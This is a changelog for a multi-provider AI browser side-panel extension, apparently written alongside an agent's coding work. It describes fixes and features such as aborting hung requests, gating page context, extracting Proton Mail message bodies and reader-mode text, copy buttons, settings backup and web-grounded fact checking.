Reported behavior: if a request to a model hangs (network stall, an unresponsive provider, etc.), the whole panel gets stuck - the composer is disabled while streaming (by design), and both of the other two ways to leave the conversation were *also* silently blocked the entire time a request was in flight: `clearBtn`'s click handler returned immediately if `isStreaming`, and `selectConversation()` (used by the history dropdown, including its "New Topic" entry) reverted the dropdown and returned immediately too. There was no cancel/abort mechanism at all - a hung request had no way to end short of closing and reopening the whole side panel.

Fix, in two parts:
- **background.js**: each in-flight request now gets its own `AbortController`, tracked per port connection alongside a `requestId` sent with it. A new `STOP` message (sent with that `requestId`) aborts the matching request's `fetch()`/stream reader; a `STOP` for a non-matching id is ignored, so it can't cross-cancel a different, still-wanted request. An abort surfaces to the existing catch block as a `DOMException` named `AbortError`, which is now explicitly *not* reported as an `ERROR` - the user asked for this, it isn't a failure. The port's `onDisconnect` handler (added in v1.8.5) now also aborts whatever request is active, so a fully closed panel doesn't leave an orphaned fetch running with no listener either.
- **sidepanel.js**: `clearBtn`'s handler and both branches of `selectConversation()` (New Topic and switching to a different past conversation) no longer block while `isStreaming` - they call a new `stopActiveRequest()` first, which sends `STOP` for the current request, immediately clears the pending/streaming bubble, and resets streaming state on this side regardless of whether the abort message actually reaches (or is acted on by) the other end in time, since a hang is exactly the situation this needs to recover from without depending on anything responding. Every `ASK` now carries a `requestId`, echoed back on `START`/`CHUNK`/`DONE`/`ERROR`; `handlePortMessage` ignores anything whose `requestId` doesn't match what's currently being tracked, so a message that was already in flight for a just-abandoned request (a chunk queued on the port before the abort reached the fetch, for instance) can't resurrect the old bubble or get appended to whatever conversation is active by the time it arrives.

Verified with a background.js-only test simulating a genuinely hung `fetch()` (a promise that only ever settles when its `AbortSignal` fires, the same way a real stalled request behaves): confirms a `STOP` with a mismatched `requestId` leaves an unrelated hung request untouched, a matching `STOP` aborts it with no `ERROR`/`DONE` posted, and a fresh request on the same port afterward starts normally. A second background.js-only test confirms a port disconnect (panel closed) also aborts whatever was still hung. A full side-panel UI test (real `sidepanel.html`/`sidepanel.js`) reproduces the reported hang directly (`START` arrives, then nothing, ever) and confirms the composer is genuinely stuck at that point, then confirms clicking "Clear" sends `STOP`, unsticks every disabled control, clears the stuck bubble, and resets to New Topic; confirms a stray late message for the now-abandoned request afterward is correctly ignored; and confirms picking a different conversation from the history dropdown escapes a second hang the same way. Re-ran every prior test - two (`harness.mjs`, `harness3.mjs`) needed their simulated background.js responses updated to also echo the new `requestId`, matching the same change a real background.js now needs; a third (`harness4.mjs`) had the identical gap.

## Fixed: "Read current page" had no explicit per-request instruction, a leftover duplicate set of provider-dispatch branches, and no re-verification layer in background.js (v1.10.9)

Reported behavior: with "Read current page" unchecked, a question should be answered independently of any webpage, using only general knowledge; checked, the answer should use the active page's content.

This package's `background.js` and `sidepanel/sidepanel.js` (specifically the `ASK` payload construction and the provider-dispatch chain) supported image attachments - encoded locally and sent as multimodal content to whichever provider supports it - but, unlike a page-context fix made against an earlier state of this project, did not include an `includePageContext` flag in the `ASK` payload, did not re-derive a `requestPageContext` value in `background.js` from it, and the provider-dispatch `if`/`else if` chain in the `ASK` handler had two full sets of branches for `deepseek`/`claude`/`openai`/`openrouter` - the first four (added alongside image support, each correctly passing the new `normalizedImages` argument) always matched first, making the second, older set of four (calling each `streamXxx()` with its pre-image five-argument shape, which would have passed `ctx` into the `images` parameter had any of them ever run) permanently unreachable dead code.

None of this put page data on the wire incorrectly by itself - `sidepanel.js`'s `pageContext` variable was still only ever assigned when the checkbox was checked, so an unchecked box still resulted in `pageContext: null` reaching `background.js` - but it removed the second, independent layer that a request's page-context state didn't depend on trusting a single value along the way, and the model was still only ever told something when page context was present, never given an explicit instruction for the OFF case.

Fix:
- `sidepanel/sidepanel.js`: the `ASK` payload now also sends `includePageContext: includeContextToggle.checked === true`, and `pageContext` is re-gated on that same check before being sent, independent of the `images` field (unaffected, still built from `readyAttachments`).
- `background.js`: the `ASK` handler now destructures `includePageContext` and computes `const requestPageContext = includePageContext === true ? pageContext : null` before dispatching to any provider, and the dispatch chain's dead second set of four branches was deleted, leaving exactly one branch per provider (verified by counting `model.provider === "..."` occurrences in the file - one each for `gemini`/`deepseek`/`claude`/`openai`/`openrouter`).
- `buildMessages()` and `buildSystemInstruction()` now both call a new `pageContextInstruction(pageContext)` helper - unconditional, naming "Read current page" as ON or OFF by name - instead of only ever adding page-related text when a page was present. The OFF instruction explicitly notes it has nothing to do with attached images/files, which should still be used normally; this note wasn't needed in a page-context fix made before image support existed, but matters now that a request can have an image attached while "Read current page" is off. This also de-duplicates a base-prompt/page-context template previously hand-copied in both functions.

Verified with a Node-only test that extracts the real, current `pageContextInstruction()`/`buildMessages()`/`buildSystemInstruction()` from `background.js` and checks, across OFF/ON and with/without an attached image: OFF never contains page title/URL/text anywhere in the constructed request, regardless of whether an image is attached; an attached image is still present in the request's content in every case (OFF+image, ON+image); ON contains the expected page title/URL/text; and every case's system instruction explicitly says ON or OFF by name. `node --check` confirms every JS file in the package still parses after the edits. Grepped the dispatch chain to confirm exactly one branch remains per provider. This could not be verified against a real Brave side panel from this sandbox (no browser/`chrome.*` runtime available here) - worth a real click-through per the Deployment steps above with an image attached and the checkbox both on and off.

## Fixed: Proton Mail's opened message body was never captured by "Read current page" (v1.10.10)

Reported behavior: opening an email in Proton Mail's inbox and asking a question with "Read current page" checked should let the assistant use that email's content; instead, the extension could not read the selected email's body.

Investigation: verified against an actual MHTML snapshot of a Proton Mail inbox with a message open (parsed with Python's `email` module - MHTML stores each frame, including iframes, as its own MIME part). Proton Mail renders the opened message's body inside `iframe[data-testid="content-iframe"]`, with `sandbox="allow-same-origin allow-popups allow-popups-to-escape-sandbox"` - deliberately without `allow-scripts`, so anything embedded in the email's own HTML can't execute in the app's origin. `extractPageContent()`'s generic fallback reads `document.body.innerText` on the top-level document, which never crosses into an iframe's separate document at all, so it captured the inbox list and the message header chrome around the iframe, but never the opened email itself, regardless of the extension's 20,000-character limit.

Fix: added `extractProtonMail()` to `content.js`, following the same pattern as the existing Synology MailPlus handler above it. It locates every `iframe[data-testid="content-iframe"]` (a conversation can have more than one message expanded at once), reads each one's `contentDocument.body.innerText` - reachable because the sandbox's `allow-same-origin` keeps the iframe same-origin with the parent - and pairs each body with its own subject via that iframe's own `data-subject` attribute rather than assuming a document order. Sender/recipient are read on a best-effort basis from `[data-testid="message-header-expanded:From"/":To"]` in the page around the iframe, using the nested `recipient-label`/`recipient-address` elements; if Proton's markup for these ever changes, this degrades to omitting From/To rather than blocking the body extraction, which is the part that matters.

Verified with jsdom against the real captured markup (the reporter's own MHTML snapshot: the main document plus the iframe's document, decoded separately from their respective MIME parts): the extractor correctly returns the email's actual body text, subject, sender name+address, and recipient - none of which the previous generic extractor could see. Also verified: a Proton inbox with no message open still falls through correctly to the generic list-text extractor; an unrelated page is unaffected; the existing Synology MailPlus handler is unchanged and still takes priority when both would otherwise match. jsdom has no layout engine and doesn't implement `innerText` (only `textContent`), so a same-shape polyfill was used for this test only - a test-environment gap, not something that affects the real browser, where `innerText` is standard and already relied on elsewhere in this file. Could not test inside a real Brave side panel from this sandbox - worth confirming against a live Proton Mail account, including a multi-message conversation thread.

## Investigated: extension appeared to keep summarizing the previous page after switching tabs/navigating (v1.10.11)

Reported behavior: summarize Page A, switch tabs or navigate to Page B, ask for a new summary - expected a summary of Page B, got a re-summary of Page A instead.

Investigation: simulated the exact reported sequence (tab active on Page A, request a summary, switch the mocked active tab to Page B, request again) against the real `getCurrentActiveTab()`/`getActivePageContext()` from `sidepanel.js`, with a realistic mock of `chrome.tabs.query`/`chrome.tabs.sendMessage`/`chrome.scripting.executeScript`. This came back correct: a fresh call after the switch returns Page B's tab and content, not Page A's - `getCurrentActiveTab()` already uses `currentWindow: true` (not `lastFocusedWindow`, which a past fix already moved away from), and `handleSubmit()` already calls `getActivePageContext()` fresh for every request rather than reusing anything cached. Also checked `manifest.json`'s `content_scripts` registration (correctly `matches: ["<all_urls>"]`, auto-reinjects on navigation) and found no regenerate/resend feature and no response-caching keyed on question text that could explain a stale reused answer. None of this rules out a defect specific to a live browser's actual runtime behavior that this sandbox (no real browser available) can't reproduce, but no bug was found in the tab-identification logic itself.

Given that, the most likely remaining explanation is that the model doesn't reliably treat a change in page context as invalidating its own prior answer: on a same-conversation follow-up, the model sees both its own previous reply (built from Page A's actual content, sitting in `history`) and a fresh CURRENT PAGE CONTEXT block for Page B - the existing instruction to "ignore page content from a previous tab, a previous page, or an earlier turn" is a generic, always-present reminder, easy to under-weight against a detailed prior answer about a specific different page.

Change: `sidepanel.js` now records which page (title/url only, never the page text) was used for each user message in `history` (persisted via `toStoredMessage`, so this survives conversation save/reload, not just the current session), and on each submission looks back for the most recent earlier page used in this conversation. When it differs from the current one, `pageContext` carries a `previousPage: {title, url}` hint; `background.js`'s `pageContextInstruction()` (shared by all supported providers) turns that into an explicit, contrastive instruction - naming the earlier page directly and stating outright that the current one is different and the earlier answer should not be reused - instead of relying only on the generic reminder. A same-page follow-up ("tell me more") is unaffected, since no change is detected and no extra note is added.

Verified with Node tests: the page-tracking/detection logic (extracted from the real `handleSubmit()` code) correctly identifies a page change across five scenarios - first message, same-page follow-up, an actual switch, a "Read current page" OFF turn, and switching back ON after an OFF turn (correctly looks past the OFF turn to the last real page) - and the updated `pageContextInstruction()` adds the contrastive note only when a change was detected, leaving the plain ON case, the OFF case, and image attachments all unaffected (re-ran the image/ON/OFF regression suite from the previous two fixes together with this one). Could not verify against an actual live model's response, or inside a real Brave side panel - if this doesn't fully resolve it, the next useful data point is whether the small page-context indicator bar in the side panel itself shows the wrong (old) page title after switching tabs (pointing to a still-undiscovered tracking bug) versus shows the correct new page while the written answer is still about the old one (consistent with the model-compliance explanation this change targets).

## Added: reader-mode-style extraction for generic pages (v1.10.12)

`content.js`'s generic-page fallback reads `document.body.innerText` on the whole page and slices it to the 20,000-character limit undifferentiated - navigation menus, cookie banners, sidebars, and footers get mixed in with the actual content, and on a long page that site "chrome" can consume the character budget before the real content is reached at all.

`content.js` now tries a new `extractReaderModeArticle()` between the two mail-specific extractors and that generic fallback. It scores candidate containers (`article`, `main`, `[role="main"]`, and elements whose class/id suggest article/post/content) by paragraph text length vs. link density, picks the best-scoring one, strips known noise elements (nav/header/footer/aside, and anything whose class/id matches a pattern like sidebar/cookie/social/related/ad/etc.) out of *that* candidate specifically, and returns its cleaned text. If nothing scores confidently enough - too short, too link-dense, or an unusually large number of matching candidates (more likely a listing/forum page than a single article) - it returns null and `extractPageContent()` falls straight through to the original, unchanged `innerText` fallback, so this can only improve on the previous behavior, never make it worse.

This is a small original heuristic, not Mozilla's Readability.js: the extension's Content-Security-Policy is `script-src 'self'` with no bundled third-party libraries anywhere in the project (matching the hand-rolled ZIP/inflate code already in `sidepanel.js`), so it's deliberately simpler than a general-purpose library and doesn't attempt to match one's exact scoring. It only ever replaces the plain-`innerText` tier, never the Synology MailPlus or Proton Mail extractors above it.

Verified with a jsdom-driven test (loading the real, unmodified `content.js` with `chrome.runtime.onMessage` mocked, matching the approach used for the fixes above): a synthetic article page (nav + cookie banner + article with five paragraphs + a sidebar with related links and social-share links + footer) correctly returns only the article's own paragraph text, with the nav labels, cookie-banner text, sidebar links, and footer copyright all absent; a synthetic link-heavy listing page (25 short result rows, no real paragraph content) correctly falls through to the generic extractor instead of forcing a bad match; a synthetic Proton Mail page with an opened message *and* article-shaped decoy content on the same page still returns the Proton Mail body, confirming the new tier doesn't outrank the two mail-specific extractors above it; a long synthetic article (~30,600 characters of paragraph text) is correctly capped at exactly 20,000 characters; and a synthetic page with 80 candidate-matching elements correctly declines rather than scoring all of them. jsdom has no layout engine and doesn't implement `innerText` (only `textContent`) - as in the Proton Mail fix above, a same-shape polyfill was used for this test only, applied separately to the iframe's own realm in the Proton Mail regression case since jsdom gives each frame its own `HTMLElement` - a test-environment gap, not something that affects the real browser. Could not verify inside a real Brave side panel from this sandbox (no browser available here) - worth trying against a handful of real news/blog articles, since real-world sites will exercise markup patterns and edge cases a synthetic test can't anticipate.

## Added: copy buttons for messages and code blocks (v1.10.13)

Neither a whole message nor an individual fenced code block inside one could be copied without manually selecting the text first.

Two additions to `sidepanel.js`, both added via `document.createElement`/`addEventListener` rather than through the markdown-to-HTML string that `sanitizeRenderedHtml` processes - `BUTTON` isn't in that function's `ALLOWED_TAGS`, on purpose, so this doesn't touch or loosen that allowlist at all:
- A per-message "📋 Copy" button in a `.bubble-actions` row, added once in `addBubble()` as a sibling of `.bubble-text` (not a child of it) - `setBubbleContent()` replaces `.bubble-text`'s content wholesale on every streamed chunk, so anything added as a child of it would be destroyed and need re-adding on every chunk; as a sibling, it survives untouched. It reads `.bubble-text`'s live `innerText` at click time (not a cached string), so it's correct whether clicked mid-stream or after the message is complete, and needs no extra state.
- A small "📋" button in the top-right corner of every fenced code block, copying only that block's own code. `markdownToHtml`'s fenced-code output is now wrapped in `<div class="code-block">` around the existing `<pre><code>` (the same idea as the existing `<div class="table-wrap">` around `<table>`, just below), so the button can anchor to a container that doesn't itself scroll horizontally - `<pre>` does, via `overflow-x`, so a button positioned against `<pre>` directly would drift out of view on a long line. A new `enhanceCodeBlocks()` call at the end of `setBubbleContent()`'s assistant branch (re-)adds these after every render, including mid-stream, since - same reason as above - each chunk's full-content replacement destroys whatever was added for the previous chunk.

Both buttons call a shared `copyTextToClipboard()`: `navigator.clipboard.writeText()` first, falling back to a temporary offscreen `<textarea>` + `document.execCommand("copy")` if that API is unavailable or throws. Clicking either briefly swaps its label to confirm the copy happened, then restores it.

Verified with a jsdom-driven test, but narrower in scope than the full-app tests described above: rather than booting the entire side panel (which would also need `chrome.runtime.connect`, `chrome.tabs.*`, and speech-recognition mocks unrelated to this feature), it extracts the real, verbatim source of the self-contained rendering cluster this touches (`markdownToHtml` through the two new buttons) and evaluates that slice directly, with `navigator.clipboard` and `document.execCommand` mocked. Six cases, sixteen assertions, all passing: a plain-text message's copy button copies the message and shows feedback; a message with one code block gets a code-copy button that copies only the code, while the message button still copies prose and code together; two code blocks in one message each get their own button copying only their own content; simulating three streamed chunks (the last two containing a growing code block) still leaves exactly one of each button afterward, not duplicates; a user message's button copies its raw text and gets no code-copy button, since user messages are never markdown-rendered; and with `navigator.clipboard` removed entirely, the button correctly falls back to `execCommand("copy")` with no leftover offscreen textarea. Could not verify the actual clipboard write, button hover states and positioning, or light/dark theme contrast in a real Brave side panel from this sandbox - worth a quick manual pass, particularly the code-block button's position on a long, horizontally-scrolled line.

## Changed: per-message copy button moved above the text, removed from the user's own messages (v1.10.14)

Feedback on v1.10.13: the user's own typed messages don't need a copy button (they're already sitting in the input the user just typed them into), and the copy button on a reply reads better above the text than below it.

`addBubble()` in `sidepanel.js` now only builds the `.bubble-header` row (model tag, when there is one, plus the copy button) for `role !== "user"`, and appends that header before `.bubble-text` rather than a `.bubble-actions` row after it - `role === "user"` bubbles get no header and no copy button at all. Error bubbles keep the button, on the same reasoning as assistant replies: they aren't something the user typed, either. `.bubble-actions` in `sidepanel.css` became `.bubble-header` (`.model-tag` and `.copy-btn` share the row, the button pinned to the right via `margin-left: auto` whether or not a model tag is present); the `.bubble.user .copy-btn` contrast override from v1.10.13 was removed as dead code, since user bubbles never render a copy button now.

Verified by extending the same jsdom harness from v1.10.13 with three more cases: an assistant message's `.bubble-header` now precedes `.bubble-text` in DOM order (button on top, not bottom); a user message has no `.bubble-header`, no `.copy-btn`, and no `.code-copy-btn` at all; and an assistant message with a model label puts the tag and the copy button in the same header, with the button still copying the message body rather than the tag text. All prior v1.10.13 cases were re-run against the restructured code and still pass unchanged - nine cases, twenty-five assertions in total, all passing. Could not verify the actual on-screen position or spacing of the header row in a real Brave side panel from this sandbox - worth a quick look, particularly a long model-tag name next to the button on a narrow panel width.

## Added: Settings Backup — one-click settings export/import (v1.10.27)

Follow-up to the v1.10.26 stable-ID fix. That fix keeps settings across in-place *updates*, but clicking "Remove" on an extension permanently deletes its entire `chrome.storage.local` — Chrome does this for every extension by design, so a remove-then-reinstall cycle always starts empty no matter what the manifest contains.

Settings (options page) now has a "Settings Backup" section: "Export settings" writes every settings key — the supported AI API keys, custom prompt, theme, UI language, preferred translation language, selected model, voice-input language, and composer height — to a single plain-text JSON file, and "Import settings" restores them in one click (validating the file's format marker and accepting only known keys with sane types, so a wrong or hand-edited file can't break anything). Use it before removing/reinstalling the extension, resetting the browser profile, or moving to another machine. The file intentionally contains API keys in readable form (that is its purpose), so it should be stored like a password. Conversation history is excluded — the existing History Management ZIP backup/restore covers it — and the two backups together move everything a user has configured.

## Confirmed: context-menu actions are top-level, not nested under an "AI" submenu; removed the dead `contextMenu_ai` string (v1.10.32)

Reported symptom: the four selection-context-menu actions (Summarize, Translate, Explain, Fact Check) still appear nested under a parent entry labeled "AI" instead of sitting directly in the top-level right-click menu.

Investigation: `rebuildContextMenus()` in `background.js` already creates all four actions (`ai-action-summarize`, `ai-action-translate`, `ai-action-explain`, `ai-action-fact-check`) with no `parentId`, and already removes the old parent submenu ID (`CONTEXT_MENU_LEGACY_PARENT_ID = "ai-assistant-context"`) plus calls `chrome.contextMenus.removeAll()` unconditionally before recreating the four items. This runs on every `onInstalled`/`onStartup` and on every service-worker cold start, so nothing in this codebase currently produces a nested "AI" submenu. If a nested "AI" entry is still visible, it is almost certainly a stale menu registration left over from before this code last ran in the browser - reloading the unpacked extension in `brave://extensions` (or restarting the browser) triggers `onStartup`/service-worker restart and should clear it. Because the manifest already has a stable `"key"` field (v1.10.26), reloading from the same folder keeps the extension ID and all `chrome.storage.local` settings intact - this is a normal reload, not a remove/reinstall.

Change actually made: `i18n.js` still defined a `contextMenu_ai` string ("AI"/"IA" per language) in all six language blocks - the old submenu's title - even though nothing has referenced that key since the submenu was removed from `background.js`. Deleted the six now-dead lines; no other file referenced this key.

Could not verify against a live Brave install from this sandbox (no browser available here) - if the nested menu persists after a reload of the unpacked extension, that would point to something other than stale registration and is worth reporting back with the exact reload steps used.

## Rich conversation rendering

Assistant responses are stored as their original Markdown/plain text, but rendered in the side panel as sanitized HTML. Supported formatting includes headings, paragraphs, bold/italic text, links, lists, blockquotes, tables, horizontal rules, inline code, and fenced code blocks. Raw HTML from the model is escaped rather than executed. Normal browser selection/copy operates on the rendered DOM, so copying selected content copies readable text/rich text rather than HTML tags.


## Web-grounded Fact Check (v1.10.33)

Fact Check can optionally use Tavily Search to retrieve current web evidence before the selected AI model evaluates the claims. The workflow is intentionally bounded to reduce search cost: up to five candidate factual claims are selected from the current page or highlighted text, each claim gets a basic Tavily news search with up to four results, duplicate URLs are removed, and the resulting evidence is supplied to the AI model with strict instructions not to invent sources.

Configure the Tavily Search API key and enable **Use online research for Fact Check** in Settings. Tavily currently provides a free monthly API-credit allowance; advanced search consumes more credits than basic search, so this implementation uses basic search for the bounded Fact Check workflow.


## v1.10.34
- Fixed Web Research / Fact Check Settings formatting and added a visual divider between the Tavily section and Custom Prompt.
- Fact Check output is now explicitly required to use the user's selected display language, regardless of the language of the source material.


## v1.10.36
- Refined Fact Check Web Research settings layout: the online-research checkbox and label remain on one left-aligned row, the explanatory text follows directly beneath it, and Custom Prompt now uses the same section-title/divider styling as History Management.


## Fixed: Gemini/Claude/ChatGPT ignored the display-language output requirement (v1.10.39)

`background.js` sends an `outputLanguageInstruction()` string with every request so answers follow the UI language chosen in Settings, not just for Fact Check. For DeepSeek and OpenRouter this is built into the message list by `buildMessages(..., ctx.lang)`. `streamGemini()`, `streamClaude()`, and `streamOpenAI()` instead build a single system-instruction string via `buildSystemInstruction(pageContext, customPrompt)` — three arguments, but the function's third parameter is `lang`. Because it was never passed, `lang` was `undefined` inside `buildSystemInstruction()`, `outputLanguageName(undefined)` fell back to its `OUTPUT_LANGUAGE_NAMES.en` default, and the instruction sent to these three providers always said "Respond entirely in English," regardless of the selected display language (e.g. Japanese). Fixed by passing `ctx.lang` as the third argument at all three call sites.
